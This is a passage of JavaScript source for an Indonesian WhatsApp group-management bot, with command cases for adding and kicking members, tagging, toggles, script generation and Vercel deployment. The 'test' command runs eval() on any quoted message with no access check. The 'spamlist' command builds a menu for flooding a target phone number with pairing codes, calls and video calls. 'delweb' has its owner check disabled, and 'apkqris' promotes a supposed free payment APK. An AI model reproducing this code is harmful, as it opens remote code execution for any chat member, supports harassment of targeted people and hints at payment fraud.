      ReplyLanz("✅ *Status video berhasil diunggah ke grup!*");
    } 
    else if (/audio/.test(mime)) {
      const buffer = await Putzz.downloadAndSaveMediaMessage(quoted);
      await Putzz.sendMessage(jid, { groupStatusMessage: { audio: buffer } });
      ReplyLanz("✅ *Status audio berhasil diunggah ke grup!*");
    } 
    else if (caption) {
      await Putzz.sendMessage(jid, { groupStatusMessage: { text: caption } });
      ReplyLanz("✅ *Status teks berhasil diunggah ke grup!*");
    } 
    else {
      ReplyLanz("❌ *Format tidak dikenal! Gunakan .upswgc <media atau teks>*");
    }
  } catch (e) {
    console.error("[UPSWGC ERROR]", e);
    ReplyLanz("❌ Terjadi kesalahan saat mengunggah status grup.");
  }
  break;
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "add": {
if (!m.isGroup) return ReplyLanz(mess.group)
if (!isCreator && !isAdmins) return ReplyLanz(mess.admin)
if (!isBotAdmins) return ReplyLanz(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Putzz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return ReplyLanz("Nomor tidak terdaftar di whatsapp")
const res = await Putzz.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return ReplyLanz(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return ReplyLanz(JSON.stringify(res, null, 2))
}} else {
return ReplyLanz(example("62838###"))
}
}
break

case "get": {
    if (!m.quoted) return ReplyLanz("Example : get <reply pesan>");
    const biji = m.quoted.fakeObj; // pesan yang dikutip
    const qType = Object.keys(biji.message)[0] || "unknown";
    
    const messType = {
        [qType]: biji.message[qType] // ambil langsung dari quoted
    };
    
    let formatted = "";
    try {
        formatted = JSON.stringify(messType, null, 2);
    } catch {
        formatted = String(messType);
    }
    
    await Putzz.sendMessage(
        m.chat,
        { text: formatted },
        { quoted: m }
    );
}
break;
case "test": {
const funcCode =
   m.quoted.text ||
   m.quoted.caption ||
   ""
let peh = eval(`(${funcCode})`)
        await Putzz.relayMessage(
            m.chat,
            peh,
            { messageId: m.key.id } 
        );
}
break;

case "dor":
case "beban":
  console.log('Case beban triggered')
  if (!m.isGroup) return ReplyLanz(mess.group)
  if (!isOwner && !isAdmins) return ReplyLanz(mess.admin)
  if (!isBotAdmins) return ReplyLanz(mess.botAdmin)
  if (m.stickerMessage) {
    console.log('Ada stiker')
    if (m.stickerMessage.fileSha256 === 'AZXnSkIq8kO2FtHVfCPC9dlQ2wNAg2fWN3jbFpiCFbQ=') {
      const input = m.sender
      const res = await Putzz.groupParticipantsUpdate(m.chat, [input], 'remove')
      await ReplyLanz(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
    } else {
      await Putzz.sendMessage(m.chat, {sticker: { url: './source/media/mengeluarkan.webp' }}, { quoted: m })
    }
  } else if (m.quoted && m.quoted.stickerMessage) {
    console.log('Ada quoted stiker')
    if (m.quoted.stickerMessage.fileSha256 === 'AZXnSkIq8kO2FtHVfCPC9dlQ2wNAg2fWN3jbFpiCFbQ=') {
      const input = m.quoted.sender
      const res = await Putzz.groupParticipantsUpdate(m.chat, [input], 'remove')
      await ReplyLanz(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
    } else {
      await Putzz.sendMessage(m.chat, {sticker: { url: './source/media/mengeluarkan.webp' }}, { quoted: m })
    }
  }
  break

 

  case "kick":
case "kik" :{
await Putzz.sendMessage(m.chat, {sticker: { url: './source/media/mengeluarkan.webp' }}, { quoted: qfake})
await sleep(1000)
if (!m.isGroup) return ReplyLanz(mess.group)
if (!isOwner && !isAdmins) return ReplyLanz(mess.admin)
if (!isBotAdmins) return ReplyLanz(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Putzz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return ReplyLanz("Nomor tidak terdaftar di whatsapp")
const res = await Putzz.groupParticipantsUpdate(m.chat, [input], 'remove')
await ReplyLanz(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return ReplyLanz(example("@tag/reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mode": {
return Putzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Mode Apa Tuan',
          sections: [
            {
              title: 'PILIH MODE NYA TUAN',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'MODE SAD😢', 
                  description: 'sᴇᴅɪʜ ᴜɴᴛᴜᴋ ᴅɪʀɪ sᴇɴᴅɪʀɪ',
                  id: `.kumenangis`
                },
                {
                  title: 'MODE HAPPY😇', 
                  description: 'ʜᴀᴘᴘʏ ᴜɴᴛᴜᴋ ᴘᴜʙʟɪᴋ',
                  id: `.happy`
                }                     
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Mode Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qfake })
}
break
case "spamlist": {
if (!text || !text.includes("|")) return ReplyLanz(example("628xxx|50"));

let [phoneNumber] = text.split("|").map(item => item.trim());

 if (m.mentionedJid?.length) {
        phoneNumber = m.mentionedJid[0].replace(/@s\.whatsapp\.net$/, "").trim();
    } else if (m.quoted) {
        phoneNumber = m.quoted.sender.replace(/@s\.whatsapp\.net$/, "");
    } else {
        phoneNumber = phoneNumber.replace(/[^0-9]/g, "");
    }

    const check = await Putzz.onWhatsApp(phoneNumber);
    if (check.length < 1) return ReplyLanz("⚠️ Nomor tersebut tidak terdaftar di WhatsApp!");

//return Putzz.sendMessage(m.chat, {
 const buttons = [
    { buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Mode Apa Tuan',
          sections: [
            {
              title: 'SILAKAN PILIH TUAN',
              highlight_label: 'Recommended',
              rows: [
                { title: 'SPAM PAIRING', description: 'ᴛᴀʀɢᴇᴛ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ sᴘᴀᴍ ᴠᴇʀɪғɪᴋᴀsɪ', id: `.spampair ${text}` },
                { title: 'SPAM TELPON', description: 'ᴛᴀʀɢᴇᴛ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴄᴀʟʟ/ʀᴀᴡᴀɴ ᴋᴇɴᴏɴ', id: `.spamcall ${text}` }, 
                { title: 'SPAM VIDCALL', description: 'ᴛᴀʀɢᴇᴛ ᴍᴇɴᴇʀɪᴍᴀ ᴠɪᴅᴄᴀʟʟ/ʀᴀᴡᴀɴ ᴋᴇɴᴏɴ', id: `.spamcallvid ${text}` }, 
              ]
            }
          ]
        })
      }
      }
  ],
            buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: 'Pilih beberapa fitur ini',
            fileName: "Whaha👻",
            footer: `${botname}`,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: " https://files.catbox.moe/s8wlw4.jpg",
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: " https://whatsapp.com/channel/0029Vax8HY61dAwBEIeWbE1G",
                    mediaType: 1
                }
            }
        
};
        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "leave": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!m.isGroup) return ReplyLanz(mess.group)
await ReplyLanz("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await Putzz.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetlinkgc": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!m.isGroup) return ReplyLanz(mess.group)
if (!isBotAdmins) return ReplyLanz(mess.botAdmin)
await Putzz.groupRevokeInvite(m.chat)
ReplyLanz("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tagall": {
if (!m.isGroup) return ReplyLanz(mess.group)
if (!isCreator && !isAdmins) return ReplyLanz(mess.admin)
if (!text) return ReplyLanz(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await Putzz.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "linkgc": {
if (!m.isGroup) return ReplyLanz(mess.group)
if (!isBotAdmins) return ReplyLanz(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await Putzz.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await Putzz.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ht5": case "hidetag5": {
if (!m.isGroup) return ReplyLanz(mess.group)
if (!isCreator && !isAdmins) return ReplyLanz(mess.admin)
if (!text) return ReplyLanz(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await Putzz.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: fdoc})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "apkqris": {
m.reply (` *MAU APK QRIS ALL PAYMENT FREE TANYA DEV PUTZZ SOALNYA DI SIMPAN KATA SANDI NYA XIXXI*
_Kata sandi ada di Dev Putzz 6283824410117 `)
Putzz.sendMessage
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joingc": case "join": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return ReplyLanz("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Putzz.groupAcceptInvite(result)
ReplyLanz(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "get": case "g": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("https://example.com"))
let data = await fetchJson(text)
ReplyLanz(JSON.stringify(data, null, 2))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joinch": case "joinchannel": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text && !m.quoted) return ReplyLanz(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return ReplyLanz("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await Putzz.newsletterMetadata("invite", result)
await Putzz.newsletterFollow(res.id)
ReplyLanz(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoread": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return ReplyLanz(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return ReplyLanz("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return ReplyLanz(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return ReplyLanz("Berhasil mematikan *autoread*")
} else return ReplyLanz(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autopromosi": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return ReplyLanz(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return ReplyLanz("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return ReplyLanz(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return ReplyLanz("Berhasil mematikan *autopromosi*")
} else return ReplyLanz(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autotyping": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return ReplyLanz(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return ReplyLanz("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return ReplyLanz(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return ReplyLanz("Berhasil mematikan *autotyping*")
} else return ReplyLanz(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'autoreactionsw':
case 'reactsw':
if (!isCreator) return ReplyLanz(mess.owner)
   if (!text) return ReplyLanz(`*Contoh:* autoreactionsw on / off`)
   if (text.toLowerCase() === 'on') {
      Putzz.autoReactionSW = true
      ReplyLanz(`Fitur auto reaction di status WhatsApp *aktif*`)
   } else if (text.toLowerCase() === 'off') {
      Putzz.autoReactionSW = false
      ReplyLanz(`Fitur auto reaction di status WhatsApp *nonaktif*`)
   } else {
      ReplyLanz(`Pilihan hanya *on* atau *off*`)
   }
   break
case "autoreadsw": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return ReplyLanz(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return ReplyLanz("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return ReplyLanz(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return ReplyLanz("Berhasil mematikan *autoreadsw*")
} else return ReplyLanz(example("on/off"))
}
break



// KRET ESCE KES
//let csc = require('./createsc.js')
case 'addfitur': {
    if (!isCreator) return ReplyLanz("❗ *Access Denied*\nFitur ini hanya untuk Owner.");

    const args = text.split('∆');
    if (args.length < 3) return ReplyLanz(`\n--- Gunakan format: ---\n\`${prefix+command} namafitur∆function∆casenya∆lib/script.json,,,isi file\`\n\n--- Contoh: ---\n*${prefix+command} halo∆async function halo() {\nreturn ReplyLanz('halo')\n}∆case 'halo':{\nawait halo()\n}\nbreak;∆lib/halo.json,,,["halo"]*`);

    const [name, functionCode, caseCode, upFileRaw] = args.map(a => a.trim());

    // Memeriksa apakah file casefitur.json ada
    const casefiturPath = './library/casefitur.json';
    let icasefitur = [];

    if (fs.existsSync(casefiturPath)) {
        try {
            icasefitur = JSON.parse(fs.readFileSync(casefiturPath, 'utf-8'));
        } catch (error) {
            return ReplyLanz('❌ Terjadi kesalahan saat membaca casefitur.json');
        }
    }

    // Cek apakah fitur sudah ada
    if (icasefitur.some(f => f.name === name)) {
        return ReplyLanz(`⚠️ *Fitur "${name}" sudah ada dalam casefitur.json!*`);
    }

    // Jika function atau upFile kosong, biarkan tetap kosong
    const newFeature = {
        name: name,
        function: functionCode ? functionCode : " ", // Jika kosong, beri spasi
        casenya: caseCode ? caseCode.replace(/\\n/g, `\n`) : ``
    };

    let upFile = [];

    // **Proses upFile jika ada**
    if (upFileRaw && upFileRaw.trim() !== '') {
        const [filePath, fileContent] = upFileRaw.split(',,,');
        if (filePath && fileContent) {
            try {
                // **Konversi isi file menjadi string JSON**
                let jsonString = JSON.stringify(JSON.parse(fileContent), null, 2);

                upFile.push({ [filePath]: jsonString });

                // **Menyimpan file ke path yang ditentukan**
                fs.writeFileSync(filePath, jsonString, 'utf-8');
            } catch (error) {
                return ReplyLanz('❌ Terjadi kesalahan saat menyimpan upFile. Pastikan isi file dalam format JSON yang benar.');
            }
        }
    }

    // Tambahkan upFile jika ada
    if (upFile.length > 0) newFeature.upFile = upFile;

    // **Tambahkan ke casefitur.json**
    icasefitur.push(newFeature);

    // Simpan perubahan
    try {
        fs.writeFileSync(casefiturPath, JSON.stringify(icasefitur, null, 2), 'utf-8');
        ReplyLanz(`✅ *Fitur "${name}" berhasil ditambahkan ke casefitur.json!*`);
    } catch (error) {
        ReplyLanz('❌ Gagal menyimpan fitur baru ke casefitur.json');
    }
}
break;
case 'csfccc': {
(async () => {
let AdmZip = require("adm-zip");
let fs = require("fs");
let path = require("path");
let fetch = require("node-fetch");

const args = text.split('|');
if (args.length < 5) {
return ReplyLanz(`Format salah!\n${prefix+command} namaBot|owner|versi|pw|fitur`);
}

const [botName, ownerName, botVersion, password, featuresStr] = args;

ReplyLanz(`🗂 Process create script...`);

// 🔥 MULTI LINK (ANTI MATI)
const links = [
"https://files.catbox.moe/7z49kc.zip",
"https://files.catbox.moe/7z49kc.zip" // backup (isi beda kalau punya)
];

// TEMP
const tempDir = path.join(__dirname, "temp");
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

let tempZipPath = path.join(tempDir, `sc_${Date.now()}.zip`);
let successDownload = false;
let buffer;

// 🔥 AUTO RETRY + FALLBACK
for (let link of links) {
try {
let res = await fetch(link);

if (!res.ok) continue;

let contentType = res.headers.get("content-type") || "";
if (!contentType.includes("zip")) continue;

buffer = await res.buffer();

// cek corrupt
if (buffer.length < 1000) continue;

fs.writeFileSync(tempZipPath, buffer);
successDownload = true;
break;

} catch (e) {
continue;
}
}

if (!successDownload) return ReplyLanz("❌ Gagal download script (link mati semua)");

// 🔥 EXTRACT
let extractPath = path.join(tempDir, `extract_${Date.now()}`);
fs.mkdirSync(extractPath);

let zip;
try {
zip = new AdmZip(tempZipPath);
zip.extractAllTo(extractPath, true);
} catch (e) {
fs.unlinkSync(tempZipPath);
return ReplyLanz("❌ File zip corrupt / rusak");
}

// 🔥 EDIT FILE
const casePath = path.join(extractPath, "case.js");

if (fs.existsSync(casePath)) {
let caseContent = fs.readFileSync(casePath, "utf-8");

// contoh inject sederhana
caseContent = `// Created by ${m.pushName}\n` + caseContent;

fs.writeFileSync(casePath, caseContent);
}

// 🔥 UPDATE SETTINGS
const settingsPath = path.join(extractPath, "settings.js");
if (fs.existsSync(settingsPath)) {
let txt = fs.readFileSync(settingsPath, "utf-8");

txt = txt.replace(/global\.namabot\s*=.*/g, `global.namabot = "${botName}"`);
txt = txt.replace(/global\.ownername\s*=.*/g, `global.ownername = "${ownerName}"`);
txt = txt.replace(/global\.botversion\s*=.*/g, `global.botversion = "${botVersion}"`);

fs.writeFileSync(settingsPath, txt);
}

// 🔥 REZIP
let newZip = new AdmZip();
newZip.addLocalFolder(extractPath);

let outputZip = path.join(tempDir, `result_${Date.now()}.zip`);
newZip.writeZip(outputZip);

// 🔥 KIRIM
await Putzz.sendMessage(m.chat, {
document: fs.readFileSync(outputZip),
mimetype: 'application/zip',
fileName: `sc_${botName}.zip`,
caption: `✅ Success create script

📦 Bot: ${botName}
👤 Owner: ${ownerName}
🔐 Pw: ${password}`
}, { quoted: m });

// 🔥 CLEAN (ANTI PENUH)
fs.rmSync(extractPath, { recursive: true, force: true });
fs.unlinkSync(tempZipPath);
fs.unlinkSync(outputZip);

})();
}
break;
case 'csc':
case 'createscript':
case 'createsc': {
  (async () => {
 //   if (!isCreator && !isSellerSc) return ReplyLanz("*Fitur Khusus Seller 💬*\n_Buy Seller? Chat .owner_");
    let AdmZip = require("adm-zip");
    let fs = require("fs");
    let path = require("path");
    let fetch = require("node-fetch");

    let crct = ppmenu;
    let txtcrct = `\n--- Gunakan format: ---\n\`${prefix+command} <namaBot>|<namaOwner>|<Versi script>|<Password>|<fitur1>,<fitur2>,...\`\n\n--- Contoh : ---\n*${prefix+command} Lanz BOT|PutzzOfficial|V1|12345|brat,qc,play,pinterest*\n\n> ketik .listfitursc untuk melihat fitur tersedia.\n`;

    const args = text.split('|');
    if (args.length < 5) {
      return Putzz.sendMessage(m.chat, { image: { url: crct }, caption: txtcrct }, { quoted: m });
    }

    const mycfitur = require('../library/casefitur.json');
    const [botName, ownerName, botVersion, password, featuresStr] = args;
    let features = featuresStr.split(',').map(f => f.trim());
    if (features.includes("allfitur")) features = mycfitur.map(f => f.name);

    ReplyLanz(`🗂 *Process Script Created*\n> [ \`${botName}\` ]`);

    const fixLink = "https://files.catbox.moe/53vvrf.zip";

    try {
      let res = await fetch(fixLink);
      let buffer = await res.arrayBuffer();

      // === TEMP FOLDER DI DALAM ./system/temp ===
      const tempDir = path.join(__dirname, "temp");
      if (!fs.existsSync(tempDir)) {
        fs.mkdirSync(tempDir, { recursive: true });
      }

      let tempZipPath = path.join(tempDir, "disini.zip");
      fs.writeFileSync(tempZipPath, Buffer.from(buffer));

      let zip = new AdmZip(tempZipPath);
      let extractPath = path.join(tempDir, `extracted_${m.pushName || 'user'}`);
      zip.extractAllTo(extractPath, true);

      const casePath = `${extractPath}/case.js`;
      let caseContent = fs.readFileSync(casePath, 'utf-8');
      let validFeatures = [];

      for (let feature of features) {
        let data = mycfitur.find(f => f.name === feature);
        if (!data) {
          ReplyLanz(`⚠ *Fitur "${feature}" tidak ditemukan!*`);
          continue;
        }

        if (!caseContent.includes(data.function)) {
          caseContent = data.function + '\n' + caseContent;
        }

        if (!caseContent.includes(data.casenya)) {
          caseContent = caseContent.replace('switch (command) {', `switch (command)\ndibawah allcase LanzOfficial-ID {\n${data.casenya}`);
        }

        if (data.upFile?.length > 0) {
          for (let file of data.upFile) {
            let filePath = Object.keys(file)[0];
            let fileContent = file[filePath];
            let fullPath = path.join(extractPath, filePath);
            fs.mkdirSync(path.dirname(fullPath), { recursive: true });
            fs.writeFileSync(fullPath, fileContent, 'utf-8');
          }
        }

        validFeatures.push(feature);
        await new Promise(r => setTimeout(r, 500));
      }

      fs.writeFileSync(casePath, caseContent, 'utf-8');

      const updateText = (filePath, updates) => {
        let text = fs.readFileSync(filePath, 'utf-8');
        for (let [pattern, replacement] of updates) {
          text = text.replace(new RegExp(pattern, 'g'), replacement);
        }
        fs.writeFileSync(filePath, text, 'utf-8');
      };

      updateText(`${extractPath}/connection.js`, [[`const pw = ".*?";`, `const pw = "${password}";`]]);
      updateText(`${extractPath}/settings.js`, [
        [`global.owner = .*`, `global.owner = "${m.sender.split('@')[0]}";`],
        [`global.namabot = .*`, `global.namabot = '${botName}';`],
        [`global.ownername = .*`, `global.ownername = '${ownerName}';`],
        [`global.botversion = .*`, `global.botversion = '${botVersion}';`]
      ]);

      fs.writeFileSync(`${extractPath}/database/owner.json`, JSON.stringify([m.sender.split('@')[0]]), 'utf-8');

      const listMenuPath = `${extractPath}/lib/listmenu.json`;
      let menu = fs.existsSync(listMenuPath) ? JSON.parse(fs.readFileSync(listMenuPath)) : [];
      validFeatures.forEach(f => { if (!menu.includes(f)) menu.push(f) });
      fs.writeFileSync(listMenuPath, JSON.stringify(menu, null, 2), 'utf-8');

      let newZip = new AdmZip();
      newZip.addLocalFolder(extractPath);
      let outputZip = path.join(tempDir, `sc_${m.pushName || 'user'}.zip`);
      newZip.writeZip(outputZip);

      if (validFeatures.length === 0) return ReplyLanz("❌ Tidak ada fitur valid!");

      await Putzz.sendMessage(m.chat, {
        document: fs.readFileSync(outputZip),
        mimetype: 'application/zip',
        fileName: `sc_${botName}.zip`,
        caption: `✅ *Success Script Created!*\n> By Lanz Official\n\n*Creator:* ${m.pushName || 'user'}\n*Fitur:* [${validFeatures}]\n*Password:* ${password}`
      }, { quoted: m });

      fs.rmSync(extractPath, { recursive: true, force: true });
      fs.unlinkSync(tempZipPath);
      fs.unlinkSync(outputZip);
    } catch (err) {
      console.error(err);
      ReplyLanz(`❌ Terjadi error saat membuat script:\n${err.message}`);
    }
  })();
}
break;


case 'delweb': {
//if (!isCreator) return ReplyLanz('Anda tidak memiliki akses ke fitur ini');
  if (!text) return ReplyLanz('Penggunaan: .delweb <namaWeb>')
  const webName = text.trim().toLowerCase()

  const headers = {
    Authorization: `Bearer ${global.vercelToken}`
  }

  try {
    const response = await fetch(`https://api.vercel.com/v9/projects/${webName}`, {
      method: 'DELETE',
      headers
    })

    if (response.status === 200 || response.status === 204) {
      return ReplyLanz(`✅ Website *${webName}* berhasil dihapus dari Vercel.`)
    } else if (response.status === 404) {
      return ReplyLanz(`⚠️ Website *${webName}* tidak ditemukan di akun Vercel kamu.`)
    } else if (response.status === 403 || response.status === 401) {
      return ReplyLanz(`⛔ Token Vercel tidak valid atau tidak punya akses ke project ini.`)
    } else {
      let result = {}
      try {
        result = await response.json()
      } catch (e) {}
      return ReplyLanz(`❌ Gagal menghapus website:\n${result.error?.message || 'Tidak diketahui'}`)
    }

  } catch (err) {
    console.error(err)
    ReplyLanz(`Terjadi kesalahan saat mencoba menghapus:\n${err.message}`)
  }
}
break
// === FUNGSI DOWNLOAD FILE AMAN ===
// === Fungsi Download File Aman ===
async function downloadQuotedFile(m, prefix = "file", dir = "./tmp") {
  const fs = require("fs")
  const path = require("path")

  const qmsg = m.quoted ? m.quoted : m.msg ? m : null
  if (!qmsg) throw new Error("Pesan tidak valid atau tidak ada media yang bisa diunduh.")
  if (typeof qmsg.download !== "function" && !qmsg.downloadMedia)
    throw new Error("Pesan tidak memiliki media untuk diunduh.")

  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true })

  const mime = qmsg.mimetype || qmsg.msg?.mimetype || "application/octet-stream"
  const ext = mime.includes("zip") ? ".zip"
            : mime.includes("html") ? ".html"
            : ".dat"

  const filePath = path.join(dir, `${prefix}_${Date.now()}${ext}`)

  const buffer = await (qmsg.download ? qmsg.download() : qmsg.downloadMedia())
  if (!buffer || !Buffer.isBuffer(buffer)) throw new Error("Gagal mengunduh file.")
  fs.writeFileSync(filePath, buffer)
  return filePath
}

// === CASE CREATEWEB2 ===
case "createwebv2":
case "cwebv2": {
  const fs = require("fs")
  const path = require("path")
  const fetch = require("node-fetch")

  if (!isCreator) return ReplyLanz("❗ Fitur ini hanya untuk owner!")
  if (!text) return ReplyLanz("📘 Penggunaan: .createweb2 <namaWeb>")
  if (!m.quoted) return ReplyLanz("❌ Reply file .html atau .zip yang asli!")

  const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, "")
  if (!webName) return ReplyLanz("❌ Nama website tidak valid!")
  if (!global.vercelToken) return ReplyLanz("❌ global.vercelApiKey belum diatur!")

  ReplyLanz("📥 Mengunduh file...")

  try {
    const filePath = await downloadQuotedFile(m, webName)
    const fileData = fs.readFileSync(filePath)
    const encoded = fileData.toString("base64")

    ReplyLanz("🚀 Mengupload ke Vercel...")

    // === Kirim ke Vercel API ===
    const vercelApi = "https://api.vercel.com/v2/now/deployments"
    const body = {
      name: webName,
      files: [
        {
          file: path.basename(filePath),
          data: encoded
        }
      ],
      projectSettings: {
        framework: "static"
      }
    }

    const res = await fetch(vercelApi, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${global.vercelToken}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify(body)
    })

    const result = await res.json().catch(() => ({}))
    if (!res.ok) throw new Error(result.error?.message || res.statusText)

    const url = result?.url ? `https://${result.url}` : "Tidak ada URL"
    ReplyLanz(`✅ Website *${webName}* berhasil di-deploy!\n\n🌐 URL: ${url}`)

    try { fs.unlinkSync(filePath) } catch {}

  } catch (err) {
    console.error("❌ Error createweb2:", err)
    ReplyLanz(
      "❌ Gagal membuat website!\n\n" +
      "Kemungkinan:\n" +
      "• File corrupt / salah format\n" +
      "• API Vercel error / token salah\n\n" +
      `🧩 Error: ${err.message}`
    )
  }
}
break
case 'createweb22':
case 'cweb0': {
  const fs = require("fs")
  const path = require("path")
  const fetch = require("node-fetch")
  const FormData = require("form-data")

  if (!isCreator) return ReplyLanz("❗ Fitur ini hanya untuk owner!")
  if (!text) return ReplyLanz("📘 Penggunaan: .createweb2 <namaWeb>")
  if (!qmsg || !/html|zip/.test(qmsg.mimetype)) 
    return ReplyLanz("❌ Reply file .html atau .zip yang asli!")

  const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, "")
  if (!webName) return ReplyLanz("❌ Nama website tidak valid!")
  if (!global.vercelApiKey) return ReplyLanz("❌ API key Vercel belum diatur di global.vercelApiKey!")

  ReplyLanz("🚀 Sedang mengupload file ke Vercel...")

  try {
    // ====== Download File dari pesan ======
    const buffer = await qmsg.download()
    if (!buffer || buffer.length === 0) throw new Error("File kosong!")

    // ====== Simpan sementara ======
    const tmpDir = path.join(process.cwd(), "tmp")
    if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir)
    const ext = qmsg.mimetype.includes("zip") ? ".zip" : ".html"
    const filename = path.join(tmpDir, `${webName}_${Date.now()}${ext}`)
    fs.writeFileSync(filename, buffer)

    // ====== Buat FormData untuk upload ======
    const form = new FormData()
    form.append("name", webName)
    form.append("projectSettings[framework]", "static")
    form.append("files", fs.createReadStream(filename))

    // ====== Upload ke Vercel ======
    const vercelApi = "https://api.vercel.com/v13/deployments"
    const res = await fetch(vercelApi, {
      method: "POST",
      headers: {
